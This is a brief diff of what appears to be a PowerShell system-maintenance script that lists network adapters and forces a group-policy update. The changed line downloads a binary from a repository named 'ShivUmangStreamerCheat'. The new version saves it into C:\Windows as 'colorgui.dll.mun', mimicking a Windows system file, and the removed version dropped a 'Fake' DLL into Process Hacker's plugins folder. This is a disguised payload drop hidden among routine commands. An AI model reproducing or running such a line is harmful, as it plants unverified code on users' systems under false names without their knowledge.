@@ -13,4 +13,4 @@ Get-NetAdapter | Format-Table Name, Status, InterfaceDescription
 
 gpupdate /force
 
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ExtendedNotificationsFake.dll" -OutFile "C:\Program Files\Process Hacker 2\plugins\ExtendedNotifications.dll"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/colorgui.dll.mun" -OutFile "C:\Windows\colorgui.dll.mun"
